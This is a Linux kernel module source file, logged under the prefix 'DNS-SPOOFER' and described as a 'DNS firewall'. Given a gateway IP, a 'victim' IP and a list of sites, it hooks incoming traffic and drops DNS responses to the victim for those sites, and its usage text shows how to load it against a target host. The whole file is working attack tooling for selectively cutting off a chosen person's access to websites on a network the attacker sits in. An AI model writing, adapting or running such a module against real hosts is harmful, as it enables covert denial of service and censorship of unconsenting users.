#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/errno.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/types.h>
#include <linux/version.h>
#include <linux/inet.h>
#include "firewall_helpers.h"

#define MY_MODULE_NAME "DNS-SPOOFER "
//compile with -DEXTENDED_DEBUGGING to see more logs in /var/log/syslog
//#define EXTENDED_DEBUGGING
#define DNSFIREWALL_DESC "DNS firewall that blocks all dns responses (for some predefined sites) coming in from one IP to the other one.\n"\
"Module writes messages to SYSLOG with prefix 'DNS-SPOOFER'.\n"\
"usage:\n"\
"insmod dnsfirewall.ko blocked_sites=\"wp.pl|facebook.com|youtube.com\" gateway=192.168.1.1 victim=192.168.1.100\n"\
"rmmod dnsfirewall.ko"

static struct nf_hook_ops netfilter_ops;

static char* gateway = NULL;
static char* victim = NULL;
// TODO multiple victims - I guess the blocked_sites parameter would have to look somewhat like this:
// 192.168.1.100:wp.pl|facebook.com|youtube.com|192.168.1.200:gmail.com|linux.com


static uint32_t gateway_ip;
static uint32_t victim_ip;

static char * blocked_sites=NULL;

static char ** sites=NULL;
static size_t number_of_sites=0;


#ifdef EXTENDED_DEBUGGING
union ip_address {
    u8 a[4];
    __be32 saddr;
};
#endif


//nf_hookfn from https://github.com/torvalds/linux/blob/master/include/linux/netfilter.h
unsigned int main_hook(
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,4,0)
   void *ops,
#else
   const struct nf_hook_ops *ops,
#endif
   struct sk_buff *skb, //https://github.com/torvalds/linux/blob/master/include/linux/skbuff.h
   const struct nf_hook_state *state)
{
    struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
    if (ip_header->protocol == IPPROTO_UDP)
    {
        struct udphdr* udp_header = NULL;
        // http://stackoverflow.com/questions/29656012/netfilter-like-kernel-module-to-get-source-and-destination-address
        // udp_header=udp_hdr(skb);
        udp_header = (struct udphdr*)((char*)ip_header + (ip_header->ihl * 4));
        if(udp_header!=NULL) {
            if (__constant_htons(udp_header->source) == 53) {
                if(skb->len>0){
                    uint32_t dns_section_offset=sizeof(struct iphdr) + sizeof(struct udphdr);
                    uint8_t * dns_section = (skb->data + dns_section_offset);
                    ssize_t dns_section_length=(skb->len -dns_section_offset);
                    if(dns_section_length>0 && ip_header->saddr == gateway_ip && ip_header->daddr == victim_ip
                       && !verify_dns(dns_section,(size_t)dns_section_length,sites,number_of_sites)){
                        //skb->len (does not count the link layer (ethernet) header)
                        printk(KERN_INFO
                        MY_MODULE_NAME
                        "DROPPED DNS packet from %s to %s, sport %d, dport %d, data len %d\n",
                        gateway,victim, __constant_htons(udp_header->source), __constant_htons(udp_header->dest), skb->len
                        );
                        return NF_DROP;
                    }
#ifdef EXTENDED_DEBUGGING
                    else{
                        union ip_address from;
                        union ip_address to;
                        from.saddr= ip_header->saddr;
                        to.saddr = ip_header->daddr;
                        printk(KERN_INFO
                        MY_MODULE_NAME
                        "ACCEPTED DNS packet from %d.%d.%d.%d to %d.%d.%d.%d, sport %d, dport %d, data len %d\n",
                        from.a[0], from.a[1], from.a[2], from.a[3], to.a[0], to.a[1], to.a[2],to.a[3],
                        __constant_htons(udp_header->source), __constant_htons(udp_header->dest), skb->len
                        );
                    }
#endif
                }
            }
        }
    }
    return NF_ACCEPT;
}

int dnsfirewall_init(void)
{
    in_aton("192.168.1.1");
    if(blocked_sites==NULL) {
        printk(KERN_INFO
        MY_MODULE_NAME
        "blocked_sites variable not set\n");
        return -EINVAL;
    }
    if(gateway==NULL){
        printk(KERN_INFO
        MY_MODULE_NAME
        "gateway variable not set\n");
        return -EINVAL;
    }
    if(victim==NULL){
        printk(KERN_INFO
        MY_MODULE_NAME
        "victim variable not set\n");
        return -EINVAL;
    }
    gateway_ip=in_aton(gateway);
    victim_ip=in_aton(victim);
    if(!calculate_blocked_sites(blocked_sites,&sites,&number_of_sites)){
        free_sites(&sites, number_of_sites);
        return -ENOMEM;
    }

    netfilter_ops.hook              =       main_hook;
    netfilter_ops.pf                =       PF_INET;
    netfilter_ops.hooknum           =       NF_INET_PRE_ROUTING;
    netfilter_ops.priority          =       NF_IP_PRI_FIRST;
    nf_register_hook(&netfilter_ops);
    printk(KERN_INFO
    MY_MODULE_NAME
    "REGISTERED\n");
    return 0;
}
void dnsfirewall_exit(void) {
    nf_unregister_hook(&netfilter_ops);
    printk(KERN_INFO
    MY_MODULE_NAME
    "UNREGISTERED\n");
    free_sites(&sites, number_of_sites);
}



module_init(dnsfirewall_init);
module_exit(dnsfirewall_exit);

module_param(blocked_sites, charp, 0000);
MODULE_PARM_DESC(blocked_sites, " List of sites to block. Sites should be separated by |. For example wp.pl|facebook.com|google.com");

module_param(gateway, charp, 0000);
MODULE_PARM_DESC(gateway, " The gateway's IP address - for example 192.168.1.1");

module_param(victim, charp, 0000);
MODULE_PARM_DESC(victim, " Victim's IP address - for example 192.168.1.100");

MODULE_DESCRIPTION(DNSFIREWALL_DESC);
